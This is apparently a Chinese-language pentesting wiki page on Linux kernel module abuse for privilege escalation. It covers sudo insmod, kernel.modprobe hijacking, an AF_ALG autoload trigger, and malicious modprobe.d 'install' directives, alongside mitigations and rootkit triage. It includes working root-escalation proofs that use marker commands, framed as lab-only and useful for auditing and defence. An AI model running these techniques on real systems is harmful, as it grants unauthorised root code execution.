# Kernel Modules 和 modprobe 滥用

{{#include ../../banners/hacktricks-training.md}}

## Kernel module 和模块加载配置错误

在 Linux privilege escalation review 期间，Kernel module 支持是影响重大的检查领域。不要仅凭 unsigned-module 消息就认定存在可利用的问题，而应利用它来回答实际问题。<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[8]](#references)[[9]](#references)[[10]](#references)</sup>

- 当前用户能否通过 `sudo`、capabilities 或可写的 helper 路径加载模块？
- 模块加载是否仍处于启用状态？
- 模块签名强制执行是否已禁用？
- 模块目录、模块文件或 `modprobe.d` 配置路径是否可写？<sup>[[16]](#references)</sup>
- 是否可以读取 kernel logs 来确认发生了什么？

快速初步检查可以从以下模块状态、签名、日志和模块树检查开始。<sup>[[1]](#references)[[2]](#references)[[6]](#references)[[8]](#references)</sup>

```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
grep -Eo '(^| )module\.sig_enforce(=[^ ]*)?' /proc/cmdline 2>/dev/null
grep -E '^(CONFIG_STATIC_USERMODEHELPER|CONFIG_STATIC_USERMODEHELPER_PATH)=' "/boot/config-$(uname -r)" 2>/dev/null
grep -E '^(CONFIG_MODULE_SIG|CONFIG_MODULE_SIG_FORCE)=' "/boot/config-$(uname -r)" 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```

解释：

- `modules_disabled=1` 表示既不能加载也不能卸载模块，并且直到重启前都无法将该值重置为 `0`。<sup>[[1]](#references)</sup>
- 内核命令行中的 `module.sig_enforce=1` 或 `CONFIG_MODULE_SIG_FORCE=y` 要求模块必须经过有效签名；否则，未签名的模块仍可能被加载，并使内核带上 taint 标记。<sup>[[2]](#references)</sup>
- `dmesg_restrict=0` 表示不限制对 `dmesg` 的访问；设为 `1` 时，则需要 `CAP_SYSLOG`。<sup>[[1]](#references)</sup>
- `/lib/modules/$(uname -r)/` 下可写的路径很危险，因为 `modprobe` 加载模块时会搜索该目录树及其依赖数据。<sup>[[8]](#references)</sup>

### 加载模块并读取内核输出

如果你有合法权限加载本地模块，`insmod` 会插入你提供的确切 `.ko` 文件。模块的 init 函数会在加载过程中运行，通过 `printk()` 写入的消息会进入内核日志缓冲区，通常使用 `dmesg` 读取。<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

最基本的检查流程是使用 `modinfo` 检查元数据，使用 `insmod` 和 `rmmod` 加载和移除模块，使用 `lsmod` 确认模块是否已加载，并使用 `dmesg` 检查内核日志。<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```

如果 `sudo -l` 允许使用 `insmod`、`modprobe` 或它们的包装程序，请将其视为严重风险：`sudo -l` 会列出调用用户的权限，而加载内核模块需要 `CAP_SYS_MODULE`。有关基于 capability 的直接利用途径，请参阅 [Linux capabilities](../interesting-files-permissions/linux-capabilities.md#cap_sys_module)。<sup>[[3]](#references)[[9]](#references)[[10]](#references)</sup>

```bash
sudo -l
sudo /sbin/insmod ./example.ko
```

### 允许通过 sudo 执行的 `insmod`

允许用户运行 `insmod` 的 sudo 规则，与允许运行普通管理辅助程序不可相提并论。模块的初始化代码会在插入过程中运行，因此实际审查时要问的是：该用户能否选择或修改要加载的模块。<sup>[[3]](#references)</sup>

以下通用审查流程会针对候选模块，重复执行检查、加载、状态、日志和移除检查。<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```

如果用户能够提供任意 `.ko`，在授权评估中应将此规则视为系统已完全失陷。更安全的操作方式是避免通过 sudo 委派模块加载；如果无法避免，则应限制确切路径、所有权、权限、签名策略和移除流程。<sup>[[3]](#references)[[10]](#references)</sup>

在受控实验室中，以下展示了一种无害的模块构建模式，包含最简源码和 Makefile；`make -C /lib/modules/$(uname -r)/build M=$PWD` 形式遵循内核文档中针对外部模块的 kbuild 工作流程。<sup>[[5]](#references)[[7]](#references)</sup>

```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
    printk(KERN_INFO "demo module loaded\n");
    return 0;
}

static void __exit demo_exit(void) {
    printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

仅在授权实验室中构建和加载；kbuild 用于构建外部模块，而 load/remove 命令会调用内核模块接口。<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)</sup>

```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```

### `kernel.modprobe` / `modprobe_path` 滥用检查

`kernel.modprobe` 指定内核在收到模块自动加载请求时执行的用户空间辅助程序；此 sysctl 影响自动加载，不影响显式插入模块。如果攻击者能将其改为一个可写的可执行文件路径，并触发模块请求，该辅助程序就会成为特权代码执行路径。将其设为空字符串可禁用自动加载请求；如果 `CONFIG_STATIC_USERMODEHELPER=y`，非空值会被编译时指定的静态辅助程序路径覆盖。<sup>[[1]](#references)</sup>

通过内核 sysctl 接口检查当前辅助程序路径，并检查目标文件的所有权和权限模式。<sup>[[1]](#references)</sup>

```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```

检查是否能够影响 sysctl、委派的 sudo 规则或文件 capabilities。<sup>[[1]](#references)[[9]](#references)[[10]](#references)[[15]](#references)</sup>

```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```

以下模式仅适用于实验环境：它会更改 helper 路径并触发有文档记录的模块自动加载请求；仅可在隔离且经授权的系统上使用。<sup>[[1]](#references)</sup>

在当前 Linux 内核上，不要使用未知可执行文件作为通用触发器：旧式自定义二进制格式模块自动加载功能已在 Linux 6.14 中移除，而内核文档将未知文件系统类型列为模块自动加载请求路径。<sup>[[1]](#references)[[11]](#references)</sup>

```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger a documented module-autoload request (requires mount privilege)
sudo mount -t definitely-not-a-filesystem none /mnt 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```

在经过强化的系统上，如果权限阻止非特权用户写入 `kernel.modprobe`、helper 路径不可写，或模块自动加载已禁用，此操作应当失败。<sup>[[1]](#references)</sup>

### 非特权 AF_ALG 自动加载触发器

上面的文件系统触发方式使用了特权 `mount`。<sup>[[1]](#references)</sup> 如果 AF_ALG 套接字可用，非特权调用者可以改为将其绑定到一个刻意设置为不存在的类型。<sup>[[17]](#references)[[18]](#references)</sup> 随后，`alg_bind()` 会通过 `request_module()` 请求加载 `algif-<type>`，从而调用已配置的模块 helper。<sup>[[17]](#references)[[18]](#references)[[19]](#references)</sup> 即使 Linux 6.14 移除了旧版未知二进制格式自动加载功能，这种方式仍然有效。<sup>[[11]](#references)[[17]](#references)</sup> 由于该类型并不存在，`bind()` 失败是预期结果；应检查 helper 是否产生副作用，而不是查看套接字的返回值。<sup>[[17]](#references)[[18]](#references)</sup>

在经过授权的实验环境中，先配置好受控的 helper 或 `modprobe.d` 规则，然后在不使用 `sudo` 或 `CAP_SYS_MODULE` 的情况下触发一次请求。<sup>[[17]](#references)[[18]](#references)</sup> Python 3.6+ 支持 AF_ALG 的 `(type, name)` 绑定元组。<sup>[[20]](#references)</sup>

```bash
cat /proc/sys/kernel/modprobe
cat /proc/sys/crypto/af_alg_restrict 2>/dev/null
python3 - <<'PYCODE'
import socket
with socket.socket(socket.AF_ALG, socket.SOCK_SEQPACKET, 0) as s:
    try:
        s.bind(("htprobe", "unused"))
    except OSError as exc:
        print(f"bind returned: {exc}")
PYCODE
```

此路径要求存在可用的 AF_ALG socket 和非空的 `kernel.modprobe`。<sup>[[1]](#references)[[18]](#references)</sup> 在包含 `/proc/sys/crypto/af_alg_restrict` 的内核上，值为 `2` 时会禁用 AF_ALG socket 创建；值为 `1` 时会限制算法，但不会阻止 `alg_bind()` 中对缺失类型的请求。<sup>[[18]](#references)[[21]](#references)</sup> LSM 可能会在调用 helper 之前拒绝模块请求。<sup>[[19]](#references)</sup>

### 可写的 `modprobe.d` 配置与 `sudo modprobe -C`

在解析模块之前，`modprobe` 会按优先级顺序读取配置目录中的 `.conf` 文件，例如 `/etc/modprobe.d`、`/run/modprobe.d`、`/usr/local/lib/modprobe.d`、`/usr/lib/modprobe.d` 和 `/lib/modprobe.d`。高优先级目录中的同名文件会遮蔽低优先级目录中的文件。更重要的是，`install <module> <command>` 指令会运行任意 shell 命令，**而不是**插入该模块。因此，可写的配置路径可能会导致延迟命令执行，执行时使用之后调用特权 `modprobe` 的进程凭据；内核模块签名强制机制不会验证这条用户空间命令。<sup>[[16]](#references)</sup>

审核目录和文件权限，然后检查生效的配置。`modprobe -n -v` 可安全地用于检查解析结果，因为 dry-run 模式既不会插入模块，也不会执行 `install`/`remove` 命令。建议使用 `modprobe -c`，而不是旧版的 `--showconfig` 写法；当前 kmod 文档标明，后者将在 kmod 36 之后移除。<sup>[[8]](#references)[[16]](#references)</sup>

```bash
for d in /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d /usr/lib/modprobe.d /lib/modprobe.d; do
    [ -e "$d" ] || continue
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
done

grep -RHE '^[[:space:]]*(install|remove|alias|blacklist)[[:space:]]' \
  /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d \
  /usr/lib/modprobe.d /lib/modprobe.d 2>/dev/null
modprobe -c 2>/dev/null | grep -E '^(install|remove|alias|blacklist)[[:space:]]'
modprobe -n -v <module_name>
```

即使任意 `.ko` 文件无法通过签名验证，不受限制的 `modprobe` sudo 规则仍可被利用：`-C` 可指定攻击者控制的配置目录，sudo 启动的进程会执行其中的 `install` 命令。<sup>[[8]](#references)[[16]](#references)</sup>

```bash
# Authorized lab proof for an unrestricted `sudo modprobe` rule
D="$(mktemp -d)"
printf '%s\n' 'install ht_probe /bin/sh -c "id > /tmp/ht-modprobe-id"' > "$D/00-ht.conf"
sudo /sbin/modprobe -C "$D" ht_probe
cat /tmp/ht-modprobe-id
```

如果 kernel helper 可见的 `modprobe.d` 目录可写，同一个 [AF_ALG autoload trigger](#unprivileged-af_alg-autoload-trigger) 可以立即运行 `install algif-htprobe` 指令，无需等待管理员调用 `modprobe`。<sup>[[16]](#references)[[18]](#references)[[19]](#references)</sup> 在授权的 lab 中，可在可写的 `.conf` 文件中放置一条无害的 marker 命令，使用 `modprobe -n -v algif-htprobe` 确认解析结果，然后运行上述 trigger。<sup>[[8]](#references)[[16]](#references)</sup> `modules_disabled=1` 和 module signature enforcement 会阻止 module insertion，但不会阻止这个 userspace `install` 命令；空的 `kernel.modprobe` 或被阻止的 AF_ALG 路径则会阻止这条 autoload 路径。<sup>[[1]](#references)[[2]](#references)[[16]](#references)[[18]](#references)[[19]](#references)</sup>

```bash
printf '%s\n' 'install algif-htprobe /bin/sh -c "id > /tmp/ht-modprobe-id"' > /etc/modprobe.d/zz-htprobe.conf
modprobe -n -v algif-htprobe
# Run the AF_ALG trigger above, then inspect /tmp/ht-modprobe-id.
```

对于缓解措施，不要通过 sudo 授予不限制参数的 `modprobe` 权限；确保所有配置目录均由 root 所有且不可写，并检查意外的 `install`/`remove` 指令。如果受信任的管理工作流必须针对某个模块绕过此类指令，`modprobe --ignore-install` 会忽略针对该模块的指令，但依赖项仍可能有自己的命令。<sup>[[8]](#references)[[16]](#references)</sup>

### 可写的 `/lib/modules` 检查

可写的模块目录可能导致模块被替换、植入恶意模块，或被滥用于自动加载，具体取决于之后如何调用 `modprobe`；解析模块时，`modprobe` 会搜索 `/lib/modules/$(uname -r)` 并使用其中的依赖数据。<sup>[[8]](#references)</sup>

检查当前内核版本模块树下可写的模块文件以及依赖项/别名元数据。<sup>[[8]](#references)</sup>

```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```

如果发现可写的模块内容，请检查 `modprobe` 如何解析依赖项，以及 `modinfo` 如何报告模块元数据。<sup>[[8]](#references)[[12]](#references)</sup>

```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```

防御说明：

- 确保 `/lib/modules` 的所有者为 `root:root`，且用户不可写。<sup>[[8]](#references)</sup>
- 在操作允许的情况下，在启动后设置 `kernel.modules_disabled=1`。<sup>[[1]](#references)</sup>
- 对需要可加载模块的系统强制执行模块签名。<sup>[[2]](#references)</sup>
- 监控对 `/proc/sys/kernel/modprobe`、`/lib/modules` 和 `modprobe.d` 配置目录的写入，以及意外执行的 `insmod`/`modprobe`。<sup>[[1]](#references)[[8]](#references)[[16]](#references)</sup>



## 基于模块的 rootkit 排查

恶意模块可以挂钩系统调用、VFS 或 `/proc` 视图、网络路径，或凭据检查，以隐藏进程和文件、重定向流量或截取机密。它也可以从 `lsmod` 显示的模块列表中移除自身。持久化可能通过 `modprobe.d` 别名或安装规则、`/etc/modules-load.d`、systemd 单元、initramfs 内容，或替换合法的 `.ko` 文件实现。正常的 `lsmod` 结果是有用的证据，但内核级入侵可能导致内核提供的列表不再可靠。应关联分析已加载模块、磁盘上的文件、启动配置、模块加载日志，以及可信的外部遥测数据。

```bash
cat /proc/modules
lsmod
find /lib/modules/"$(uname -r)" -type f -name '*.ko*' -ls 2>/dev/null
grep -R -nE '^(install|softdep|blacklist|options) ' /etc/modprobe.d /run/modprobe.d /usr/lib/modprobe.d 2>/dev/null
find /etc/modules-load.d /usr/lib/modules-load.d -maxdepth 1 -type f -print 2>/dev/null
journalctl -k -b | grep -Ei 'module|taint|signature|lockdown'
cat /proc/sys/kernel/tainted
```

检查异常的模块名称、路径、依赖关系、签名和加载时间。Kernel taint 和 unsigned-module 消息只能作为线索，不能作为 rootkit 的证据。如果怀疑存在 rootkit，应先从可信映像或恢复环境中收集证据，再依赖实时内核输出。[kernel vulnerability assessment](kernel-vulnerability-assessment.md) 页面介绍了配置和诊断信息暴露问题，包括 tracefs 和 pinned BPF objects。



## References

- [1] [/proc/sys/kernel/ 文档 — Linux Kernel 文档](https://docs.kernel.org/admin-guide/sysctl/kernel.html)
- [2] [Kernel module signing facility — Linux Kernel 文档](https://www.kernel.org/doc/html/latest/admin-guide/module-signing.html)
- [3] [init_module(2) — Linux 手册页](https://man7.org/linux/man-pages/man2/init_module.2.html)
- [4] [insmod(8) — Linux 手册页](https://man7.org/linux/man-pages/man8/insmod.8.html)
- [5] [Driver Basics — Linux Kernel 文档](https://docs.kernel.org/driver-api/basics.html)
- [6] [使用 printk 记录消息 — Linux Kernel 文档](https://docs.kernel.org/core-api/printk-basics.html)
- [7] [构建外部模块 — Linux Kernel 文档](https://docs.kernel.org/kbuild/modules.html)
- [8] [modprobe(8) — Linux 手册页](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [9] [sudo(8) — Linux 手册页](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [10] [capabilities(7) — Linux 手册页](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [11] [合并标签 'execve-v6.14-rc1' — torvalds/linux](https://github.com/torvalds/linux/commit/fadc3ed9ce1cd9ecc5c8be8875f7ec11ab3a7ebe)
- [12] [modinfo(8) — Linux 手册页](https://man7.org/linux/man-pages/man8/modinfo.8.html)
- [13] [lsmod(8) — Linux 手册页](https://man7.org/linux/man-pages/man8/lsmod.8.html)
- [14] [rmmod(8) — Linux 手册页](https://man7.org/linux/man-pages/man8/rmmod.8.html)
- [15] [getcap(8) — Linux 手册页](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [16] [modprobe.d(5) — Linux 手册页](https://man7.org/linux/man-pages/man5/modprobe.d.5.html)
- [17] [重探 modprobe_path 技术：绕过 search_binary_handler() 补丁 — Theori](https://theori.io/blog/reviving-the-modprobe-path-technique-overcoming-search-binary-handler-patch)
- [18] [AF_ALG 绑定和模块请求 — Linux kernel 源代码](https://github.com/torvalds/linux/blob/master/crypto/af_alg.c)
- [19] [模块 helper 调用 — Linux kernel 源代码](https://github.com/torvalds/linux/blob/master/kernel/module/kmod.c)
- [20] [socket — Python 文档](https://docs.python.org/3/library/socket.html)
- [21] [/proc/sys/crypto/ — Linux kernel 文档](https://docs.kernel.org/admin-guide/sysctl/crypto.html)
{{#include ../../banners/hacktricks-training.md}}
